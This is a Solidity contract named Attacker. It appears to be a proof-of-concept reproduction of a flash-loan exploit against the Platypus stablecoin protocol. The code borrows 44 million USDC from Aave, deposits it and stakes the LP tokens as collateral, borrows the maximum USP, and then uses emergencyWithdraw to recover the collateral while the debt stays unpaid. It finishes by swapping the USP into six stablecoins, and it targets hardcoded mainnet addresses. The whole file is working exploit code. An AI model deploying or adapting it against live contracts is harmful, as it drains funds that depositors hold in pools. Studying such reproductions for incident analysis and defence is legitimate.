// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/utils/structs/EnumerableMap.sol";
import "forge-std/interfaces/IERC20.sol";
import "forge-std/console.sol";
import "./interfaces.sol";

contract Attacker {
    using EnumerableMap for EnumerableMap.AddressToUintMap;

    // ERC20 tokens
    address constant USDT = 0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7;
    address constant USDTe = 0xc7198437980c041c805A1EDcbA50c1Ce5db95118;
    address constant BUSD = 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39;
    address constant DAIe = 0xd586E7F844cEa2F87f50152665BCbc2C279D8d70;
    address constant USDC = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
    address constant USDCe = 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664;
    address constant USP = 0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2;

    // Others
    address constant AAVE = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address constant PLATYPUS_POOL = 0x66357dCaCe80431aee0A7507e2E361B7e2402370;
    address constant MASTER_PLATYPUS = 0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0;
    address constant PLATYPUS_TREASURE = 0x061da45081ACE6ce1622b9787b68aa7033621438;

    EnumerableMap.AddressToUintMap tokenToAmount;
    IPlatypusPool pool;
    IMasterPlatypusV4 master;
    IPlatypusTreasure treasure;

    constructor() {
        tokenToAmount.set(USDC, 2_500_000 ether);
        tokenToAmount.set(USDCe, 2_000_000 ether);
        tokenToAmount.set(USDT, 1_600_000 ether);
        tokenToAmount.set(USDTe, 1_250_000 ether);
        tokenToAmount.set(BUSD, 700_000 ether);
        tokenToAmount.set(DAIe, 700_000 ether);
        
        pool = IPlatypusPool(PLATYPUS_POOL);
        master = IMasterPlatypusV4(MASTER_PLATYPUS);
        treasure = IPlatypusTreasure(PLATYPUS_TREASURE);
    }

    function attack() external {
        IAaveLendingPool(AAVE).flashLoanSimple(
            address(this),
            USDC,
            44_000_000 * (10**IERC20(USDC).decimals()),
            "",
            0
        );
    }

    /**
     @dev AAVE flashloan callback
     */
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata 
    ) external returns (bool) {
        IERC20(asset).approve(PLATYPUS_POOL, amount);
        uint256 lpAmount = pool.deposit(
            asset,
            amount,
            address(this),
            block.timestamp + 1 minutes
        );

        address lpToken = pool.assetOf(asset);
        IERC20(lpToken).approve(MASTER_PLATYPUS, lpAmount);

        uint256 poolId = master.getPoolId(lpToken);
        master.deposit(poolId, lpAmount);

        IPlatypusTreasure.PositionView memory pv = treasure.positionView(
            address(this),
            lpToken
        );

        treasure.borrow(lpToken, pv.borrowLimitUSP);
        
        master.emergencyWithdraw(poolId);

        IERC20(lpToken).approve(PLATYPUS_POOL, lpAmount);
        pool.withdraw(
            asset, 
            lpAmount, 
            0, 
            address(this), 
            block.timestamp + 1 minutes
        );

        IERC20(USP).approve(PLATYPUS_POOL, IERC20(USP).balanceOf(address(this)));

        {
            // avoid stack too deep
            address token;
            uint fromAmount;
            for (uint i; i < tokenToAmount.length(); i++) {
                (token, fromAmount) = tokenToAmount.at(i);
                console.log("Swap %s : %s", token, fromAmount);
                pool.swap(
                    USP, 
                    token, 
                    fromAmount, 
                    0, 
                    address(this), 
                    block.timestamp + 1 minutes
                );
            }
        }

        IERC20(asset).approve(AAVE, amount + premium);
        return true;
    }

    function logBalances() public view {
        address token;
        for (uint i; i < tokenToAmount.length(); i++) {
            (token,) = tokenToAmount.at(i);
            console.log(
                "Balance %s : %s", 
                IERC20(token).name(),
                IERC20(token).balanceOf(address(this)) / (10**IERC20(token).decimals()) 
            );
        }
        console.log(
            "Balance USP : %s", 
            IERC20(USP).balanceOf(address(this)) / (10**IERC20(USP).decimals()) 
        );
    }
}